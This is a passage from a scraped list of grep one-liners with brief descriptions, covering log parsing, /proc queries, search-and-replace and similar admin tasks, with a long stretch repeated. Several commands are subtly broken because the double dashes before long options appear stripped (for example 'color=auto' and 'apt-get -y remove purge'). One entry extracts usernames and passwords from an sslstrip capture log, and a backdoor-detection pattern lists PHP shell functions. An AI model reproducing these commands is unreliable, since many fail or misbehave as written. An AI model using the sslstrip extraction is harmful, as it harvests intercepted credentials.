/var/log/* intersection between two files grep -Fx -f file1 file2 Count occurrences per minute in a log file grep <something> logfile | cut -c2-18 | uniq -c Search and Replace across multiple files grep -lr -e '<oldword>' * | xargs sed -i 's/<oldword>/<newword>/g' Quick key/value display within /proc or /sys grep -r . /sys/class/net/eth0/statistics Remove today's installed packages grep \"install \" /var/log/dpkg.log | awk '{print $4}' | xargs apt-get -y remove purge Print number of mb of free ram grep '^MemFree:' /proc/meminfo | awk '{ mem=($2)/(1024) ; printf \"%0.0f MB\\n\", mem }' Number of CPU's in a system grep \"processor\" /proc/cpuinfo | wc -l recursive search and replace old with new string, inside files grep -rl oldstring . | parallel sed -i -e 's/oldstring/newstring/' delete files containing matching text grep -r -Z -l \"<text>\" . | xargs -0 echo rm grep apache access.log and list IP's by hits and date - sorted grep Mar/2009 /var/log/apache2/access.log | awk '{ print $1 }' | sort -n | uniq -c | sort -rn | head find files containing text grep -lir \"some text\" * Recover a deleted file grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt embed referred images in HTML files grep -ioE \"(url\\(|src=)['\\\"]?[^)'\\\"]*\" a.html | grep -ioE \"[^\\\"'(]*.(jpg|png|gif)\" | while read l ; do sed -i \"s>$l>data:image/${l/[^.]*./};base64,`openssl enc -base64 -in $l| tr -d '\\n'`>\" a.html ; done; Remove comments and empty lines from a conf file grep ^[^#] /etc/file.conf Replace all tabs with spaces in an application grep -PL \"\\t\" -r . | grep -v \".svn\" | xargs sed -i 's/\\t/ /g' Finding the number of cpu's grep -c -e '^cpu[0-9]\\+' /proc/stat extract email adresses from some file (or any other pattern) grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\\.[[:alpha:].]{2,6})' file.html grep for tabs without using Ctrl-V trick grep -P '\\t' filename List the CPU model name grep \"model name\" /proc/cpuinfo cat a bunch of small files with file indication grep . * Edit all files found having a specific string found by grep grep -Hrli 'foo' * | xargs vim Search for a string inside all files in the current directory grep -r <pattern> * .[!.]* Search for a string in all files recursively grep -ir string * Find common groups between two users grep -xFf <(groups user1|cut -f3- -d\\ |sed 's/ /\\n/g') <(groups user2|cut -f3- -d\\ |sed 's/ /\\n/g') Regenerate the /etc/mtab file grep -v rootfs /proc/mounts > /etc/mtab Search files with js declarations inside grep -r \"<script\" | grep -v src | awk -F: '{print $1}' | uniq Extract IPv4 addressess from file grep -Eo \\([0-9]\\{1,3\\}[\\.]\\)\\{3\\}[0-9] file | sort | uniq grep -v with multiple patterns. grep test somefile | grep -v -e error -e critical -e warning Search some text from all files inside a directory grep -Hrn \"text\" . Recursively grep thorugh directory for string in file. grep -rni string dir Output files without comments or empty lines grep -v \"^\\($\\|#\\)\" <filenames> Search through files, ignoring .svn grep <pattern> -R . exclude-dir='.svn' grep lines containing two consecutive hyphens grep file Check if hardware is 32bit or 64bit grep -q '\\<lm\\>' /proc/cpuinfo && echo 64 bits || echo 32 bits Lists unambigously names of all xml elements used in files in current directory grep -h -o '<[^/!?][^ >]*' * | sort -u | cut -c2- Remove text from file1 which is in file2 and stores it in an other file grep -Fvf file1 file2 > file-new Extract all 404 errors from your apache accesslog (prefix lines by occurrences number) grep \"HTTP/1.1\\\" 404\" access_log | awk '{print $7 } ' | sort | uniq -c | sort -n Search trought pidgin's conversation logs for \"searchterm\", and output the result. grep -Ri searchterm ~/.purple/logs/* | sed -e 's/<.*?>//g' Prints line numbers grep -n \"^\" <filename> display a one-liner of current nagios exit statuses. great with netcat/irccat grep current_state= /var/log/nagios/status.dat|sort|uniq -c|sed -e \"s/[\\t ]*\\([0-9]*\\).*current_state=\\([0-9]*\\)/\\2:\\1/\"|tr \"\\n\" \" \" Shows the torrent file name along with the trackers url grep -ao -HP \"http://[^/]*/\" * grep -v with multiple patterns. grep 'test' somefile | grep -vE '(error|critical|warning)' Read funny developer comments in the Linux source tree grep -2riP '\\b(fuck|shit|bitch|tits|ass\\b)' /usr/src/linux/ Dump a configuration file without comments or whitespace\u2026 grep -v \"\\ *#\\|^$\" /etc/path/to.config Find all files containing a word grep -rHi searchphrase *.php Returns the number of cores in a linux machine. grep -c ^processor /proc/cpuinfo peak amount of memory occupied by any process with \"FOO\" in its name grep VmHWM /proc/$(pgrep -d '/status /proc/' FOO)/status Determine configure options used for MySQL binary builds grep CONFIG $(which mysqlbug) Remove blank lines from a file using grep and save output to new file grep -v \"^$\" filename > newfilename Makes a Zenity select list based on entries in your wpa_supplicant.conf grep -oE \"ssid=\\\".*\\\"\" /etc/wpa_supplicant.conf | cut -c6- | sed s/\\\"//g | zenity list title=\"Choose Access Point\" column=\"SSID\" strip config files of comments grep -vE '^$|^[\\s]*[;#]' Creates PodFeeds.txt, a file that lists the URLs of rhythmbox podcasts from the rhythmdb.xml file. grep -A 5 -e podcast-feed rhythmdb.xml | grep -e \"<location>\" | sed 's: *<!--*[a-t]*-->::g' > PodFeeds.txt Sort and count subjects of emails stuck in Exim queue grep -R Subject /var/spool/exim/input/ | sed s/^.*Subject:\\ // | sort | uniq -c | sort -n > ~/email_sort.$(date +%m.%d.%y).txt Get debian package names corresponding to latex packages used in a document grep -R usepackage * | cut -d']' -f2 | cut -s -d'{' -f 2 | sed s/\"}\"/.sty\"}\"/g | cut -d'}' -f1 | sort | uniq | xargs dpkg -S | cut -d':' -f1 | sort | uniq recursive search and replace old with new string, inside files grep -rlZ oldstring . | xargs -0 sed -i -e 's/oldstring/newstring/' Count lines in a file with grep grep -c \".*\" filename Search and replace in multiple files recursively grep -lr \"foo\" . | xargs sed -i \"s/foo/bar/g\" List last opened tabs in firefox browser grep -Eo '\"entries\":\\[{\"url\":\"[^\"]*\"' \"$HOME/.mozilla/firefox/*.default/sessionstore.js\" | sed 's/^.*:\"//; s/\"$//' view all lines without comments. grep -v \"^#\" file.txt | more List the CPU model name grep 'model\\|MHz' /proc/cpuinfo |tail -n 2 Look up a unicode character by name grep -i \"$*\" /usr/lib/perl5/Unicode/CharName.pm | while read a b; do /usr/bin/printf \"\\u$a\\tU+%s\\t%s\\n\" \"$b\"; done count match string lines from file(s) grep -in \"search_string\" /to/your/path extract email adresses from some file (or any other pattern) grep -aEio '([[:alnum:]_.-\\+\\-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' Search for a string inside all files in the current directory grep -nisI <pattern> * .[!.]* apache statistics grep \"10/Sep/2013\" access.log| cut -d[ -f2 | cut -d] -f1 | awk -F: '{print $2\":\"$3}' | sort -nk1 -nk2 | uniq -c | awk '{ if ($1 > 10) print $0}' Grep by paragraph instead of by line. grepp() { [ $# -eq 1 ] && perl -00ne \"print if /$1/i\" || perl -00ne \"print if /$1/i\" < \"$2\";} Sort netflow packet capture grep -o -P '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}\\s->\\s{5}[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}' <capture file> | tr -d ' ' | sed 's/:.....//g' | sort -n | uniq -c | sort -nr check spell in c source code grep -o -h -rE '\".*\"' * | ispell -l -p ~/mydict | sort -u find files containing text grep -lir \"sometext\" * > sometext_found_in.log find files beginning with filename* that do not include \"string\" grep -L \"string\" filename* Number of CPU's in a system grep -c ^processor /proc/cpuinfo This allows you to find a string on a set of files recursivly grep -rF include='*.txt' stringYouLookFor * sorted list of dhcp allocations grep ^lease /var/lib/dhcp/dhcpd.leases | cut -d ' ' -f 2 | sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n | uniq Extract all IPs from a file grep -E '([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})' -o tmp Search for string through files grep -Rl \"pattern\" files_or_dir Number of CPU's in a system grep -cE \"^processor\" /proc/cpuinfo Grep colorized grep -i color=auto Show lines that are not commented out grep \"^[^#;]\" /etc/php.ini get with grep exact x strings matches from output grep \"^[A-Za-z0-9]\\{6\\}$\" myfile.txt Check where mail was sent from grep cwd /var/log/exim_mainlog | grep -v /var/spool | awk -F\"cwd=\" '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -n Show a config file without comments grep -v ^# /etc/somefile.conf | grep . Search in files grep -i -h 'account.journal.cashbox.line' *.py cat a config file removing all comments and blank lines grep -vh '^[[:space:]]*\\(#\\|$\\)' <file> Remove comments and empty lines from a file grep -v '^#\\|^$' /etc/hdparm.conf Grep for word in directory (recursive) grep color=auto -iRnH \"$search_word\" $directory Find all files matching 'name.xml' and search for 'text' within them grep -nH \"text\" -r . include *name.xml shows whether your CPU supports 64bit mode grep -q ' lm ' /proc/cpuinfo; [ $? -eq 0 ] && echo '64bit supported' Get the URL for the git-annex webapp grep URL ~/annex/.git/annex/webapp.html | tr -d '\">' | awk -F= '{print $4 \"=\" $5}' IP list of aborted mail logins grep -i \"aborted login\" /var/log/maillog | awk 'BEGIN{FS=\"=\"}{print substr($4,8)}' | cut -d\",\" -f1 Btrfs: Find file names with checksum errors grep \"checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq Grep for non-empty lines that do not start with # (comments) or and does not include grep -v -e '^$' -e '^[#\\[]' -e '\\/' some_file Find in all files in the current directory, just a find shorthand grep -H -n \"pattern\" * grep lines containing two consecutive hyphens grep \"\\-\\-\" file Get a quote from Pooh grep -Pooh .*t..r,.* /etc/init.d/* Grep auth log and print ip of attackers grep Failed auth.log | rev | cut -d\\ -f4 | rev | sort -u calculate how many different lines between two files grep -Fvxf $(file1) $(file2) | wc -l Lists unambigously names of all xml elements used in files in current directory grep -Eho '<[a-ZA-Z_][a-zA-Z0-9_-:]*' * | sort -u | cut -c2- move linenumbers of grep output to end of line grep -n log4j MainPm.java | sed -e 's/^\\([^:]*\\):\\(.*\\)/\\2 \\1/' Search Objective-C source file for tag listing and sort grep '.tag =' <file> | awk '{print $3}' | awk 'sub(/[;]/, x)' | sort -n Search for a string inside all files in the current directory grep -RnisI <pattern> * Search for a string inside all files in the current directory grep -RnisI <pattern> * Check if a file is text grep -qIm1 . $file See how many times you've typed 'ls' by itself grep -c ^ls$ ~/.bash_history Matching Strings grep -l <string-to-match> * | xargs grep -c <string-not-to-match> | grep '\\:0' remove script from infected html files grep -ZlRr -e BAD_SCRIPT_LINE * |xargs -0 sed -i 's/BAD_SCRIPT_LINE//g' Extract names and email addresses from LDIF files grep -E '^(cn|mail):' file.ldif | sed -e 's/^[a-z]*: //' Display playing parameters of soundcards grep -r \"\" /proc/asound/card*/pcm*/sub*/hw_params extract email adresses from some file (or any other pattern) grep -aEio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' find php command backdoor grep -RPl include=*.{php,txt,asp} \"(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readf?ile) *\\(\" /var/www/ Show CPU idle and used time grep \"cpu \" /proc/stat | awk -F ' ' '{total = $2 + $3 + $4 + $5} END {print \"idle \\t used\\n\" $5*100/total \"% \" $2*100/total \"%\"}' lines in file2 that are not in file1 grep -Fxv -f file1 file2 Shows the line of the string you want to search for (like in normal grep) plus 'n' number of lines above and below it. grep -C <no_of_lines> <string> grep for specific function invocations grep -E -rn color=always exclude-dir=\".svn\" exclude-dir=\"packages\" exclude=\"*.swp\" \"(emit|on)\\([\\'\\\"]leader\" ~/project/ | less -R grep 2 words existing on the same line grep -E/egrep 'word1.*word2|word2.*word1' \"$@\" Search ruby-files with non-ascii character, but without encoding directive grep -l include '*.rb' include '*.rake' '^[^#]*[^a-zA-Z0-9[:punct:][:space:]]' -R . | xargs -L1 awk '!/encoding/ && NR < 2 { print FILENAME }' Fix SELinux problem with Postfix on Centos grep postfix /var/log/messages | audit2allow -M mypolicy Find text in all files, except in files matching a pattern grep -lir 'aMethodName' * | grep -v 'target' Get HTTP Codes for All Websites in Apache Configuration files. grep -h 'Server\\(Name\\|Alias\\)' /etc/httpd/conf.d/*.conf | sed 's#\\s*Server\\(Name\\|Alias\\)\\s*##g' | tr ' ' \"\\n\" | xargs -I{} sh -c 'echo {},`curl -s -o /dev/null -w \"%{http_code}\" {}`' grep certain file types recursively grep -r include=\"*.[ch]\" pattern . Finds javascript lodash/underscore methods in source code grep -roh '_\\.[^(]*' *.js recursive grep of text files grep -Ir foo * Get the first non-empty line in a text file grep . \"$f\" | head -n1 checklist for 64-bit java on Linux grep -l 'flags.*\\<lm\\>' /proc/cpuinfo && (getconf LONG_BIT | grep '64') && java -version Match non-empty lines grep -v \"^\\W$\" <filename> Check if hardware is 32bit or 64bit grep \" lm \" /proc/cpuinfo > /dev/null && echo \"64-bit\" || echo \"32-bit\" extract email adresses from some file (or any other pattern) grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' list all available disks and disk partitions grep -e \"[sh]d[a-l][0-9]\\?\" /proc/partitions | awk '{print $4}' grep all class definitions from all files in current directory grep -RE 'class\\s+(\\w+)' color * Count empty lines using grep grep -c \"^$\" filename Grep ip addresses from access attempts to a page and add them to an ipset referenced by an iptables rule grep page.php /var/log/httpd/access_log|awk '{print $1}'|sort|uniq|perl -e 'while (<STDIN>){chomp; $cmd=`ipset add banned -! -q $_`; }' Display how much memory installed on system grep MemTotal: /proc/meminfo # display how much memory installed grep for ip4 addresses grep -E \"[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\" to remove blank line grep . filename >filename1 grep tab chars grep \"^V<TAB>\" your_file grep multiple value matches that matches all togetger one the same value(concurrency) also grep '^\\(default\\|smtp\\|relay\\)[^ ]*concurrency[^ ]*' Export usernames and passwords from sslstrip log grep -i -f password_tokens sslstrip.log | awk ' BEGIN { RS=\"&\" } { print $1 }' | grep -i -f tokens_file grep for text in a specific file type grep -rnw <directory to search for> -e include \\*.x \"your_text\" look some php code by some keywords grep -r include=*.php \"something\" /foo/bar grep for text in a specific file type grep -rnw include \\*.x -e \"text\" <dir> count match string lines from file(s) grep -c \"search_string\" /path/to/file Reads a list of urls, fetches each one and logs the url and http status code grep \"$1\" urls.txt | awk '{print \"curl write-out \"$0\"=http-%{http_code}\\\"\\n\\\" silent output /dev/null \"$0'} | sh >> responses.txt Get all domains from html grep -oP '(?<=www\\.)\\s?[^\\/]*' file | uniq GREP a PDF file. grep -i '[^script$]' 1.txt Recursive grep of all c++ source under the current directory grep -R include=*.cpp include=*.h exclude=*.inl.h \"string\" . Remove superfluous from conf file grep -Ev '^( *$|#)' < conf.file extract only the subroutine names from a perl script grep -Po '^sub (\\w+)' file.pm | cut -d' ' -f2 Extract all urls from the last firefox sessionstore.js file used. grep -oP '\"url\":\"\\K[^\"]+' $(ls -t ~/.mozilla/firefox/*/sessionstore.js | sed q) find files ending in *.log that contain both 'foo' and 'error' grep -l foo $(grep -l error *.log) Btrfs: Find file names with checksum errors grep \"btrfs: checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq find files that contain foo, but not bar grep -l foo *cl*.log | xargs grep -lL bar Get the date field from syslog for a certain set of events grep xxxx messages | cut -d ' ' -f 1,2,3 kworker issue. Phase one: find the culprit. grep enabled /sys/firmware/acpi/interrupts/* tail from the last occurrence of a pattern to the end of the (log) file grep -n PATTERN /logs/somelog.log | cut -f1 -d: | tail -1 | xargs -I num tail -n +num /logs/somelog.log Find highest context switches grep -H voluntary_ctxt /proc/*/status |gawk '{ split($1,proc,\"/\"); if ( $2 > 10000000 ) { printf $2 \" - Process : \"; system(\"ps h -o cmd -p \"proc[3]) } }' | sort -nk1,1 | sed 's/^/Context Switches: /g' Grep recursively your Python project with color highlighting the result and line numbers grep color=always -nr 'setLevel' include=*py | less -SRqg grep tab (t) grep $'\\t' sample.txt Recursively grep thorugh directory for string in file. grep -r -i \"phrase\" directory/ Exclude svn directories with grep grep -r exclude-dir=.svn PATTERN PATH Grep Recursively Through Single File Extension grep include=*.py -lir \"delete\" . Remove today's Debian installed packages grep -e `date +%Y-%m-%d` /var/log/dpkg.log | awk '/install / {print $4}' | uniq | xargs apt-get -y remove List your installed Firefox extensions grep -hIr :name ~/.mozilla/firefox/*.default/extensions | tr '<>=' '\"\"\"' | cut -f3 -d'\"' | sort -u Find out how much data is waiting to be written to disk grep ^Dirty /proc/meminfo grep binary (hexadecimal) patterns grep -P \"\\x05\\x00\\xc0\" mybinaryfile Remove newlines from output grep . filename Grep syslog today last hour grep -i \"$(date +%b\\ %d\\ %H)\" syslog Grep log between range of minutes grep -i \"$(date +%b\" \"%d )13:4[0-5]\" syslog Colorized grep in less grep color=always | less -R Remove blank lines from a file using grep and save output to new file grep . filename > newfilename Get all possible problems from any log files grep -2 -iIr \"err\\|warn\\|fail\\|crit\" /var/log/* intersection between two files grep -Fx -f file1 file2 Count occurrences per minute in a log file grep <something> logfile | cut -c2-18 | uniq -c Search and Replace across multiple files grep -lr -e '<oldword>' * | xargs sed -i 's/<oldword>/<newword>/g' Quick key/value display within /proc or /sys grep -r . /sys/class/net/eth0/statistics Remove today's installed packages grep \"install \" /var/log/dpkg.log | awk '{print $4}' | xargs apt-get -y remove purge Print number of mb of free ram grep '^MemFree:' /proc/meminfo | awk '{ mem=($2)/(1024) ; printf \"%0.0f MB\\n\", mem }' Number of CPU's in a system grep \"processor\" /proc/cpuinfo | wc -l recursive search and replace old with new string, inside files grep -rl oldstring . | parallel sed -i -e 's/oldstring/newstring/' delete files containing matching text grep -r -Z -l \"<text>\" . | xargs -0 echo rm grep apache access.log and list IP's by hits and date - sorted grep Mar/2009 /var/log/apache2/access.log | awk '{ print $1 }' | sort -n | uniq -c | sort -rn | head find files containing text grep -lir \"some text\" * Recover a deleted file grep -a -B 25 -A 100 'some string in the file' /dev/sda1 > results.txt embed referred images in HTML files grep -ioE \"(url\\(|src=)['\\\"]?[^)'\\\"]*\" a.html | grep -ioE \"[^\\\"'(]*.(jpg|png|gif)\" | while read l ; do sed -i \"s>$l>data:image/${l/[^.]*./};base64,`openssl enc -base64 -in $l| tr -d '\\n'`>\" a.html ; done; Remove comments and empty lines from a conf file grep ^[^#] /etc/file.conf Replace all tabs with spaces in an application grep -PL \"\\t\" -r . | grep -v \".svn\" | xargs sed -i 's/\\t/ /g' Finding the number of cpu's grep -c -e '^cpu[0-9]\\+' /proc/stat extract email adresses from some file (or any other pattern) grep -Eio '([[:alnum:]_.]+@[[:alnum:]_]+?\\.[[:alpha:].]{2,6})' file.html grep for tabs without using Ctrl-V trick grep -P '\\t' filename List the CPU model name grep \"model name\" /proc/cpuinfo cat a bunch of small files with file indication grep . * Edit all files found having a specific string found by grep grep -Hrli 'foo' * | xargs vim Search for a string inside all files in the current directory grep -r <pattern> * .[!.]* Search for a string in all files recursively grep -ir string * Find common groups between two users grep -xFf <(groups user1|cut -f3- -d\\ |sed 's/ /\\n/g') <(groups user2|cut -f3- -d\\ |sed 's/ /\\n/g') Regenerate the /etc/mtab file grep -v rootfs /proc/mounts > /etc/mtab Search files with js declarations inside grep -r \"<script\" | grep -v src | awk -F: '{print $1}' | uniq Extract IPv4 addressess from file grep -Eo \\([0-9]\\{1,3\\}[\\.]\\)\\{3\\}[0-9] file | sort | uniq grep -v with multiple patterns. grep test somefile | grep -v -e error -e critical -e warning Search some text from all files inside a directory grep -Hrn \"text\" . Recursively grep thorugh directory for string in file. grep -rni string dir Output files without comments or empty lines grep -v \"^\\($\\|#\\)\" <filenames> Search through files, ignoring .svn grep <pattern> -R . exclude-dir='.svn' grep lines containing two consecutive hyphens grep file Check if hardware is 32bit or 64bit grep -q '\\<lm\\>' /proc/cpuinfo && echo 64 bits || echo 32 bits Lists unambigously names of all xml elements used in files in current directory grep -h -o '<[^/!?][^ >]*' * | sort -u | cut -c2- Remove text from file1 which is in file2 and stores it in an other file grep -Fvf file1 file2 > file-new Extract all 404 errors from your apache accesslog (prefix lines by occurrences number) grep \"HTTP/1.1\\\" 404\" access_log | awk '{print $7 } ' | sort | uniq -c | sort -n Search trought pidgin's conversation logs for \"searchterm\", and output the result. grep -Ri searchterm ~/.purple/logs/* | sed -e 's/<.*?>//g' Prints line numbers grep -n \"^\" <filename> display a one-liner of current nagios exit statuses. great with netcat/irccat grep current_state= /var/log/nagios/status.dat|sort|uniq -c|sed -e \"s/[\\t ]*\\([0-9]*\\).*current_state=\\([0-9]*\\)/\\2:\\1/\"|tr \"\\n\" \" \" Shows the torrent file name along with the trackers url grep -ao -HP \"http://[^/]*/\" * grep -v with multiple patterns. grep 'test' somefile | grep -vE '(error|critical|warning)' Read funny developer comments in the Linux source tree grep -2riP '\\b(fuck|shit|bitch|tits|ass\\b)' /usr/src/linux/ Dump a configuration file without comments or whitespace\u2026 grep -v \"\\ *#\\|^$\" /etc/path/to.config Find all files containing a word grep -rHi searchphrase *.php Returns the number of cores in a linux machine. grep -c ^processor /proc/cpuinfo peak amount of memory occupied by any process with \"FOO\" in its name grep VmHWM /proc/$(pgrep -d '/status /proc/' FOO)/status Determine configure options used for MySQL binary builds grep CONFIG $(which mysqlbug) Remove blank lines from a file using grep and save output to new file grep -v \"^$\" filename > newfilename Makes a Zenity select list based on entries in your wpa_supplicant.conf grep -oE \"ssid=\\\".*\\\"\" /etc/wpa_supplicant.conf | cut -c6- | sed s/\\\"//g | zenity list title=\"Choose Access Point\" column=\"SSID\" strip config files of comments grep -vE '^$|^[\\s]*[;#]' Creates PodFeeds.txt, a file that lists the URLs of rhythmbox podcasts from the rhythmdb.xml file. grep -A 5 -e podcast-feed rhythmdb.xml | grep -e \"<location>\" | sed 's: *<!--*[a-t]*-->::g' > PodFeeds.txt Sort and count subjects of emails stuck in Exim queue grep -R Subject /var/spool/exim/input/ | sed s/^.*Subject:\\ // | sort | uniq -c | sort -n > ~/email_sort.$(date +%m.%d.%y).txt Get debian package names corresponding to latex packages used in a document grep -R usepackage * | cut -d']' -f2 | cut -s -d'{' -f 2 | sed s/\"}\"/.sty\"}\"/g | cut -d'}' -f1 | sort | uniq | xargs dpkg -S | cut -d':' -f1 | sort | uniq recursive search and replace old with new string, inside files grep -rlZ oldstring . | xargs -0 sed -i -e 's/oldstring/newstring/' Count lines in a file with grep grep -c \".*\" filename Search and replace in multiple files recursively grep -lr \"foo\" . | xargs sed -i \"s/foo/bar/g\" List last opened tabs in firefox browser grep -Eo '\"entries\":\\[{\"url\":\"[^\"]*\"' \"$HOME/.mozilla/firefox/*.default/sessionstore.js\" | sed 's/^.*:\"//; s/\"$//' view all lines without comments. grep -v \"^#\" file.txt | more List the CPU model name grep 'model\\|MHz' /proc/cpuinfo |tail -n 2 Look up a unicode character by name grep -i \"$*\" /usr/lib/perl5/Unicode/CharName.pm | while read a b; do /usr/bin/printf \"\\u$a\\tU+%s\\t%s\\n\" \"$b\"; done count match string lines from file(s) grep -in \"search_string\" /to/your/path extract email adresses from some file (or any other pattern) grep -aEio '([[:alnum:]_.-\\+\\-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' Search for a string inside all files in the current directory grep -nisI <pattern> * .[!.]* apache statistics grep \"10/Sep/2013\" access.log| cut -d[ -f2 | cut -d] -f1 | awk -F: '{print $2\":\"$3}' | sort -nk1 -nk2 | uniq -c | awk '{ if ($1 > 10) print $0}' Grep by paragraph instead of by line. grepp() { [ $# -eq 1 ] && perl -00ne \"print if /$1/i\" || perl -00ne \"print if /$1/i\" < \"$2\";} Sort netflow packet capture grep -o -P '[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}\\s->\\s{5}[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\:[0-9]{1,5}' <capture file> | tr -d ' ' | sed 's/:.....//g' | sort -n | uniq -c | sort -nr check spell in c source code grep -o -h -rE '\".*\"' * | ispell -l -p ~/mydict | sort -u find files containing text grep -lir \"sometext\" * > sometext_found_in.log find files beginning with filename* that do not include \"string\" grep -L \"string\" filename* Number of CPU's in a system grep -c ^processor /proc/cpuinfo This allows you to find a string on a set of files recursivly grep -rF include='*.txt' stringYouLookFor * sorted list of dhcp allocations grep ^lease /var/lib/dhcp/dhcpd.leases | cut -d ' ' -f 2 | sort -t . -k 1,1n -k 2,2n -k 3,3n -k 4,4n | uniq Extract all IPs from a file grep -E '([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})\\.([0-9]{1,3})' -o tmp Search for string through files grep -Rl \"pattern\" files_or_dir Number of CPU's in a system grep -cE \"^processor\" /proc/cpuinfo Grep colorized grep -i color=auto Show lines that are not commented out grep \"^[^#;]\" /etc/php.ini get with grep exact x strings matches from output grep \"^[A-Za-z0-9]\\{6\\}$\" myfile.txt Check where mail was sent from grep cwd /var/log/exim_mainlog | grep -v /var/spool | awk -F\"cwd=\" '{print $2}' | awk '{print $1}' | sort | uniq -c | sort -n Show a config file without comments grep -v ^# /etc/somefile.conf | grep . Search in files grep -i -h 'account.journal.cashbox.line' *.py cat a config file removing all comments and blank lines grep -vh '^[[:space:]]*\\(#\\|$\\)' <file> Remove comments and empty lines from a file grep -v '^#\\|^$' /etc/hdparm.conf Grep for word in directory (recursive) grep color=auto -iRnH \"$search_word\" $directory Find all files matching 'name.xml' and search for 'text' within them grep -nH \"text\" -r . include *name.xml shows whether your CPU supports 64bit mode grep -q ' lm ' /proc/cpuinfo; [ $? -eq 0 ] && echo '64bit supported' Get the URL for the git-annex webapp grep URL ~/annex/.git/annex/webapp.html | tr -d '\">' | awk -F= '{print $4 \"=\" $5}' IP list of aborted mail logins grep -i \"aborted login\" /var/log/maillog | awk 'BEGIN{FS=\"=\"}{print substr($4,8)}' | cut -d\",\" -f1 Btrfs: Find file names with checksum errors grep \"checksum error at logical\" /var/log/messages | egrep -o \"[^ ]+$\" | tr -d ')' | sort | uniq Grep for non-empty lines that do not start with # (comments) or and does not include grep -v -e '^$' -e '^[#\\[]' -e '\\/' some_file Find in all files in the current directory, just a find shorthand grep -H -n \"pattern\" * grep lines containing two consecutive hyphens grep \"\\-\\-\" file Get a quote from Pooh grep -Pooh .*t..r,.* /etc/init.d/* Grep auth log and print ip of attackers grep Failed auth.log | rev | cut -d\\ -f4 | rev | sort -u calculate how many different lines between two files grep -Fvxf $(file1) $(file2) | wc -l Lists unambigously names of all xml elements used in files in current directory grep -Eho '<[a-ZA-Z_][a-zA-Z0-9_-:]*' * | sort -u | cut -c2- move linenumbers of grep output to end of line grep -n log4j MainPm.java | sed -e 's/^\\([^:]*\\):\\(.*\\)/\\2 \\1/' Search Objective-C source file for tag listing and sort grep '.tag =' <file> | awk '{print $3}' | awk 'sub(/[;]/, x)' | sort -n Search for a string inside all files in the current directory grep -RnisI <pattern> * Check if a file is text grep -qIm1 . $file See how many times you've typed 'ls' by itself grep -c ^ls$ ~/.bash_history Matching Strings grep -l <string-to-match> * | xargs grep -c <string-not-to-match> | grep '\\:0' remove script from infected html files grep -ZlRr -e BAD_SCRIPT_LINE * |xargs -0 sed -i 's/BAD_SCRIPT_LINE//g' Extract names and email addresses from LDIF files grep -E '^(cn|mail):' file.ldif | sed -e 's/^[a-z]*: //' Display playing parameters of soundcards grep -r \"\" /proc/asound/card*/pcm*/sub*/hw_params extract email adresses from some file (or any other pattern) grep -aEio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' find php command backdoor grep -RPl include=*.{php,txt,asp} \"(passthru|shell_exec|system|phpinfo|base64_decode|chmod|mkdir|fopen|fclose|readf?ile) *\\(\" /var/www/ Show CPU idle and used time grep \"cpu \" /proc/stat | awk -F ' ' '{total = $2 + $3 + $4 + $5} END {print \"idle \\t used\\n\" $5*100/total \"% \" $2*100/total \"%\"}' lines in file2 that are not in file1 grep -Fxv -f file1 file2 Shows the line of the string you want to search for (like in normal grep) plus 'n' number of lines above and below it. grep -C <no_of_lines> <string> grep for specific function invocations grep -E -rn color=always exclude-dir=\".svn\" exclude-dir=\"packages\" exclude=\"*.swp\" \"(emit|on)\\([\\'\\\"]leader\" ~/project/ | less -R grep 2 words existing on the same line grep -E/egrep 'word1.*word2|word2.*word1' \"$@\" Search ruby-files with non-ascii character, but without encoding directive grep -l include '*.rb' include '*.rake' '^[^#]*[^a-zA-Z0-9[:punct:][:space:]]' -R . | xargs -L1 awk '!/encoding/ && NR < 2 { print FILENAME }' Fix SELinux problem with Postfix on Centos grep postfix /var/log/messages | audit2allow -M mypolicy Find text in all files, except in files matching a pattern grep -lir 'aMethodName' * | grep -v 'target' Get HTTP Codes for All Websites in Apache Configuration files. grep -h 'Server\\(Name\\|Alias\\)' /etc/httpd/conf.d/*.conf | sed 's#\\s*Server\\(Name\\|Alias\\)\\s*##g' | tr ' ' \"\\n\" | xargs -I{} sh -c 'echo {},`curl -s -o /dev/null -w \"%{http_code}\" {}`' grep certain file types recursively grep -r include=\"*.[ch]\" pattern . Finds javascript lodash/underscore methods in source code grep -roh '_\\.[^(]*' *.js recursive grep of text files grep -Ir foo * Get the first non-empty line in a text file grep . \"$f\" | head -n1 checklist for 64-bit java on Linux grep -l 'flags.*\\<lm\\>' /proc/cpuinfo && (getconf LONG_BIT | grep '64') && java -version Match non-empty lines grep -v \"^\\W$\" <filename> Check if hardware is 32bit or 64bit grep \" lm \" /proc/cpuinfo > /dev/null && echo \"64-bit\" || echo \"32-bit\" extract email adresses from some file (or any other pattern) grep -Eio '([[:alnum:]_.-]+@[[:alnum:]_.-]+?\\.[[:alpha:].]{2,6})' list all available disks and disk partitions grep -e \"[sh]d[a-l][0-9]\\?\" /proc/partitions | awk '{print $4}' grep all class definitions from all files in current directory grep -RE 'class\\s+(\\w+)' color * Count empty lines using grep grep -c \"^$\" filename grep tab chars grep \"^V<TAB>\" 